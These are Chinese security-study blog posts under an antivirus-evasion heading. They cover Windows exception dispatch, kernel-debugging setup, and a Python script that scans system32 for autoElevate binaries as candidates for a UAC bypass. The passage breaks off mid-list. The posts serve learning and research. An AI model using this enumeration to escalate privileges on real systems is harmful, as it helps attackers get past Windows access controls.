<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _EXCEPTION_RECORD &#123;</span><br><span class="line">  DWORD                    ExceptionCode;//异常代码</span><br><span class="line">  DWORD                    ExceptionFlags;//异常状态</span><br><span class="line">  struct _EXCEPTION_RECORD *ExceptionRecord;//下一个异常地址</span><br><span class="line">  PVOID                    ExceptionAddress;//异常发生地址</span><br><span class="line">  DWORD                    NumberParameters;//附加参数个数</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];//附加参数指针</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>

<p>再看 ExceptionFlags ，CPU导致的异常这个值为0，软件调试导致的异常这个值为1</p>
<h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、CPU指令检测到异常</span><br><span class="line">2、查IDT表，执行中断处理函数</span><br><span class="line">3、调用 CommonDispatchException (构建 EXCEPTION_RECORD )</span><br><span class="line">4、KiDispatchException(分发异常：目的是找到异常的处理函数)</span><br></pre></td></tr></table></figure>

<p><strong>保存基本的TrapFrame结构</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930231653462.png" alt="image-20240930231653462"></p>
<p><strong>保存出现异常的相关参数</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930232020745.png" alt="image-20240930232020745"></p>
<p><strong>判断是否来自三环的异常</strong></p>
<p>这里0x6c指向的是SegCs </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTrap_Frame</span><br><span class="line">nt!_KTRAP_FRAME</span><br><span class="line"> ..........................</span><br><span class="line">   +0x054 Edi              : Uint4B</span><br><span class="line">   +0x058 Esi              : Uint4B</span><br><span class="line">   +0x05c Ebx              : Uint4B</span><br><span class="line">   +0x060 Ebp              : Uint4B</span><br><span class="line">   +0x064 ErrCode          : Uint4B</span><br><span class="line">   +0x068 Eip              : Uint4B</span><br><span class="line">   +0x06c SegCs            : Uint4B</span><br><span class="line">   ...................................</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930232144015.png" alt="image-20240930232144015"></p>
<p>如果是三环的异常则一定是除零异常</p>
<p><strong>调用KiDispatchException分发异常</strong></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240930232858261.png" alt="image-20240930232858261"></p>
<h2 id="模拟异常"><a href="#模拟异常" class="headerlink" title="模拟异常"></a>模拟异常</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CxxThrowException</span><br><span class="line">(KERNEL32.DLL)RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags,</span><br><span class="line">DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)</span><br><span class="line">NTDLL.DLL!RtlRaiseException()</span><br><span class="line">NT!NtRaiseException</span><br><span class="line">NT!KiRaiseException</span><br></pre></td></tr></table></figure>

<p>写一个带throw的demo</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> <span class="comment">// 包含输入输出流用于调试信息</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 捕获并处理异常</span></span><br><span class="line">    try &#123;</span><br><span class="line">        throw <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (<span class="type">int</span> e) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Exception caught: &quot;</span> &lt;&lt; e &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">    test();</span><br><span class="line">    getchar(); <span class="comment">// 等待用户输入，防止程序立即退出</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001085621731.png" alt="image-20241001085621731"></p>
<p>进入ida中分析，看见从vcruntime.dll中导入了这个函数, 继续向下跟，找到RaiseException</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001091236509.png" alt="image-20241001091236509"></p>
<p>继续进入Kernel32跟下去</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001091328186.png" alt="image-20241001091328186"></p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001092427860.png" alt="image-20241001092427860"></p>
<p>讲了这么多，就是想说在进入零环前在三环保存的Context会被保存为Trap_Frame</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241001093442881.png" alt="image-20241001093442881"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Windows%E5%BC%82%E5%B8%B8/" data-id="cm1zwlrfn000cu0v633le3l8s" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/Windows双机调试环境搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/Windows%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.562Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Windows双机调试环境搭建"><a href="#Windows双机调试环境搭建" class="headerlink" title="Windows双机调试环境搭建"></a>Windows双机调试环境搭建</h1><p>首先，下载一个windbg，微软官网就有，正常安装</p>
<h2 id="xp"><a href="#xp" class="headerlink" title="xp"></a>xp</h2><p>在C盘目录下有一个boot.ini，把内容换为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[boot loader]</span><br><span class="line">timeout=30</span><br><span class="line">default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS</span><br><span class="line">[operating systems]</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;XP Debug[2-9-9-12]&quot;</span><br><span class="line">/noexecute=optin /fastdetect /debug /debugport=com1</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;XP Debug[10-10-12]&quot; /execute=optin</span><br><span class="line">/fastdetect /debug /debugport=com1</span><br><span class="line">multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot;</span><br><span class="line">/noexecute=optin /fastdetect</span><br></pre></td></tr></table></figure>

<p>然后点击虚拟机设置，添加串口，如果有打印机设备需要将其移除，本质上是因为我们不需要打印机，且打印机会占用一个串口</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925092920048.png" alt="image-20240925092920048"></p>
<h2 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h2><p>在win10中用管理员权限启动powershell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bcdedit  /set  “&#123;current&#125;”  bootmenupolicy  Legacy             //修改启动方式为Legacy</span><br><span class="line"></span><br><span class="line">bcdedit  /dbgsettings  SERIAL  DEBUGPORT:1  BAUDRATE:115200     //设置串口1为调试端口，波特率为115200</span><br><span class="line"></span><br><span class="line">bcdedit  /copy  “&#123;current&#125;”   /d  “Debug”      //将当前配置复制到 Debug 启动配置(新建了Debug启动配置)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bcdedit  /debug  “&#123;&lt;新建的启动配置的标识符&gt;&#125;”   on        //打开调试开关，这里的标识符在运行完上面命令之后会出现</span><br><span class="line"></span><br><span class="line">bcdedit  /enum      //查看配置</span><br></pre></td></tr></table></figure>

<h2 id="附加到虚拟机上"><a href="#附加到虚拟机上" class="headerlink" title="附加到虚拟机上"></a>附加到虚拟机上</h2><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240925093049838.png" alt="image-20240925093049838"></p>
<p>正常附加windbg里面会有</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Microsoft (R) Windows Debugger Version <span class="number">10.0</span><span class="number">.27704</span><span class="number">.1001</span> AMD64</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(c)</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">Opened \\.\pipe\com_1</span><br><span class="line">Waiting to reconnect...</span><br><span class="line">Connected to Windows 10 19041 x64 target <span class="title function_">at</span> <span class="params">(Wed Sep <span class="number">25</span> <span class="number">09</span>:<span class="number">31</span>:<span class="number">09.406</span> <span class="number">2024</span> (UTC + <span class="number">8</span>:<span class="number">00</span>))</span>, ptr64 TRUE</span><br><span class="line">Kernel Debugger connection established.  <span class="params">(Initial Breakpoint requested)</span></span><br><span class="line"></span><br><span class="line">************* Path validation summary **************</span><br><span class="line">Response                         <span class="title function_">Time</span> <span class="params">(ms)</span>     Location</span><br><span class="line">Deferred                                       srv*</span><br><span class="line">Symbol search path is: srv*</span><br><span class="line">Executable search path is: </span><br><span class="line">Windows 10 Kernel Version 19041 <span class="title function_">MP</span> <span class="params">(<span class="number">4</span> procs)</span> Free x64</span><br><span class="line">Product: WinNt, suite: TerminalServer SingleUserTS</span><br><span class="line">Edition build lab: 19041.1.amd64fre.vb_release.191206-1406</span><br><span class="line">Kernel base = <span class="number">0xfffff806</span>`<span class="number">2f</span>a00000 PsLoadedModuleList = <span class="number">0xfffff806</span>`<span class="number">3062</span>a820</span><br><span class="line">Debug session time: Mon Sep <span class="number">23</span> <span class="number">01</span>:<span class="number">05</span>:<span class="number">47.383</span> <span class="number">2024</span> (UTC + <span class="number">8</span>:<span class="number">00</span>)</span><br><span class="line">System Uptime: <span class="number">0</span> days <span class="number">0</span>:<span class="number">06</span>:<span class="number">19.276</span></span><br><span class="line">Break instruction exception - code <span class="number">80000003</span> (first chance)</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*   You are seeing this message because you pressed either                    *</span><br><span class="line">*       CTRL+C (<span class="keyword">if</span> you run console kernel debugger) or,                       *</span><br><span class="line">*       CTRL+BREAK (<span class="keyword">if</span> you run GUI kernel debugger),                          *</span><br><span class="line">*   on your debugger machine<span class="number">&#x27;</span>s keyboard.                                      *</span><br><span class="line">*                                                                             *</span><br><span class="line">*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *</span><br><span class="line">*                                                                             *</span><br><span class="line">* If you did not intend to <span class="keyword">break</span> into the debugger, press the <span class="string">&quot;g&quot;</span> key, then   *</span><br><span class="line">* press the <span class="string">&quot;Enter&quot;</span> key now.  This message might immediately reappear.  If it *</span><br><span class="line">* does, press <span class="string">&quot;g&quot;</span> and <span class="string">&quot;Enter&quot;</span> again.                                          *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff806`<span class="number">2f</span>e077a0 cc              <span class="type">int</span>     <span class="number">3</span></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/Windows%E5%8F%8C%E6%9C%BA%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" data-id="cm1zwlrfm000au0v61htudtn1" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/UAC" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/UAC/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.560Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="UAC白名单挖掘"><a href="#UAC白名单挖掘" class="headerlink" title="UAC白名单挖掘"></a>UAC白名单挖掘</h1><p><strong>用户帐户控制</strong>(User Account Control)是Windows Vista（及更高版本操作系统）中一组新的基础结构技 术，可以帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统，同时也可以帮助组织部署更易于管理 的平台</p>
<p>使用UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员 级别的访问权限时除外。UAC会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改</p>
<h3 id="VS2022里面的UAC"><a href="#VS2022里面的UAC" class="headerlink" title="VS2022里面的UAC"></a>VS2022里面的UAC</h3><p>在visual studio里面有一个manifest文件，这个文件本质上是一个xml文件，用于标识当前应用程序的配 置属性，其中这几个级别明细如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aslnvoker 默认权限</span><br><span class="line">highestAvailable 最高权限</span><br><span class="line">requireAdministrator 必须是管理员权限</span><br></pre></td></tr></table></figure>

<p>我们可以在链接器-&gt;清单文件里面找到UAC的执行级别，更改执行级别</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20241002160839566.png" alt="image-20241002160839566"></p>
<h2 id="寻找UAC白名单文件"><a href="#寻找UAC白名单文件" class="headerlink" title="寻找UAC白名单文件"></a>寻找UAC白名单文件</h2><p>我们需要的UAC程序需要满足以下几个条件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 程序的manifest标识的配置属性 autoElevate 为 <span class="literal">true</span></span><br><span class="line"><span class="number">2.</span> 程序不弹出UAC弹窗</span><br><span class="line"><span class="number">3.</span> 从注册表里查询Shell\Open\command键值对</span><br></pre></td></tr></table></figure>

<p>这里可以使用sigcheck64.exe这个文件来检查，微软有官方链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sigcheck 是一种命令行实用工具，可显示文件版本号、时间戳信息和数字签名详细信息（例如证书链）。 它还提供一个用于在 VirusTotal 上检查文件状态的选项、一个针对 40 多个防病毒引擎执行自动文件扫描的站点，以及一个用于上传文件以供扫描的选项。</span><br></pre></td></tr></table></figure>

<p>这是我对虚拟机ComputerDefult.exe文件执行的结果</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Sigcheck v2.90 - File version and signature viewer</span><br><span class="line">Copyright (C) 2004-2022 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">c:\windows\system32\ComputerDefaults.exe:</span><br><span class="line">        Verified:       Signed</span><br><span class="line">        Signing date:   5:55 2024/9/6</span><br><span class="line">        Publisher:      Microsoft Windows</span><br><span class="line">        Company:        Microsoft Corporation</span><br><span class="line">        Description:    Set Program Access and Computer Defaults Control Panel</span><br><span class="line">        Product:        Microsoft?Windows?Operating System</span><br><span class="line">        Prod version:   10.0.22621.3527</span><br><span class="line">        File version:   10.0.22621.3527 (WinBuild.160101.0800)</span><br><span class="line">        MachineType:    64-bit</span><br><span class="line">        Manifest:</span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> standalone=<span class="string">&quot;yes&quot;</span>?&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Copyright (c) Microsoft Corporation --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assembly</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span>  <span class="attr">xmlns:asmv3</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span> <span class="attr">manifestVersion</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">assemblyIdentity</span></span></span><br><span class="line"><span class="tag">  <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">&quot;5.1.0.0&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">name</span>=<span class="string">&quot;Microsoft.Windows.ComputerDefaults&quot;</span> <span class="attr">type</span>=<span class="string">&quot;win32&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">description</span>&gt;</span>Set Program Access and Computer Defaults Control Panel<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependentAssembly</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">assemblyIdentity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">type</span>=<span class="string">&quot;win32&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">name</span>=<span class="string">&quot;Microsoft.Windows.Common-Controls&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">version</span>=<span class="string">&quot;6.0.0.0&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">publicKeyToken</span>=<span class="string">&quot;6595b64144ccf1df&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">processorArchitecture</span>=<span class="string">&quot;amd64&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependentAssembly</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">trustInfo</span> <span class="attr">xmlns</span>=<span class="string">&quot;urn:schemas-microsoft-com:asm.v3&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">requestedExecutionLevel</span></span></span><br><span class="line"><span class="tag">                <span class="attr">level</span>=<span class="string">&quot;highestAvailable&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">uiAccess</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">            /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">requestedPrivileges</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">security</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">trustInfo</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">asmv3:windowsSettings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">autoElevate</span>&gt;</span>true<span class="tag">&lt;/<span class="name">autoElevate</span>&gt;</span>///我们可以看见这个标签</span><br><span class="line">   <span class="tag">&lt;/<span class="name">asmv3:windowsSettings</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">asmv3:application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以通过管道符去过滤多余的信息</p>
<p>这里有一个问题，一般的文件，微软是不会给这个标签，而且有些应用程序也不是每个环境里都有</p>
<p>那么我们应该去哪里找这些带标签的exe文件呢</p>
<p>一般电脑上C盘里面都有<strong>User（不过每个人名字不太一样），windows，Programme File 还有Programme File （x86）等</strong>。</p>
<p>一个一个执行很麻烦，我们可以使用python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> *</span><br><span class="line">	path = <span class="string">&#x27;c:\windows\system32&#x27;</span></span><br><span class="line">	files = os.listdir(path)</span><br><span class="line">	<span class="built_in">print</span>(files)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetFileList</span>(<span class="params">path, fileList</span>):</span><br><span class="line">	newDir = path</span><br><span class="line">	<span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">		<span class="keyword">if</span> path[-<span class="number">4</span>:] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">			fileList.append(path)</span><br><span class="line">	<span class="keyword">elif</span> os.path.isdir(path):</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">for</span> s <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">				newDir=os.path.join(path,s)</span><br><span class="line">				GetFileList(newDir, fileList)</span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">return</span> fileList</span><br><span class="line">files = GetFileList(path, [])</span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"><span class="keyword">for</span> eachFile <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> eachFile[-<span class="number">4</span>:] == <span class="string">&#x27;.exe&#x27;</span>:</span><br><span class="line">		command = <span class="string">r&#x27;.\sigcheck64.exe -m &#123;&#125; | findstr auto&#x27;</span>.<span class="built_in">format</span>(eachFile)</span><br><span class="line">		<span class="built_in">print</span>(command)</span><br><span class="line">		p1 = Popen(command, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;&lt;autoElevate&gt;true&lt;/autoElevate&gt;&#x27;</span> <span class="keyword">in</span> p1.stdout.read().decode(<span class="string">&#x27;gb2312&#x27;</span>):</span><br><span class="line">			copy_command = <span class="string">r&#x27;copy &#123;&#125; .\success&#x27;</span>.<span class="built_in">format</span>(eachFile)</span><br><span class="line">			Popen(copy_command, shell=<span class="literal">True</span>, stdin=PIPE, stdout=PIPE)</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;[+] &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(eachFile))</span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;success.txt&#x27;</span>, <span class="string">&#x27;at&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				f.writelines(<span class="string">&#x27;&#123;&#125;\n&#x27;</span>.<span class="built_in">format</span>(eachFile))</span><br></pre></td></tr></table></figure>

<p>这是我在虚拟机上执行后的结果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">c:\windows\system32\bthudtask.exe</span><br><span class="line">c:\windows\system32\changepk.exe</span><br><span class="line">c:\windows\system32\ComputerDefaults.exe</span><br><span class="line">c:\windows\system32\dccw.exe</span><br><span class="line">c:\windows\system32\dcomcnfg.exe</span><br><span class="line">c:\windows\system32\DeviceEject.exe</span><br><span class="line">c:\windows\system32\DeviceProperties.exe</span><br><span class="line">c:\windows\system32\djoin.exe</span><br><span class="line">c:\windows\system32\easinvoker.exe</span><br><span class="line">c:\windows\system32\EASPolicyManagerBrokerHost.exe</span><br><span class="line">c:\windows\system32\eudcedit.exe</span><br><span class="line">c:\windows\system32\eventvwr.exe</span><br><span class="line">c:\windows\system32\fodhelper.exe</span><br><span class="line">c:\windows\system32\fsquirt.exe</span><br><span class="line">c:\windows\system32\immersivetpmvscmgrsvr.exe</span><br><span class="line">c:\windows\system32\iscsicli.exe</span><br><span class="line">c:\windows\system32\iscsicpl.exe</span><br><span class="line">c:\windows\system32\lpksetup.exe</span><br><span class="line">c:\windows\system32\MSchedExe.exe</span><br><span 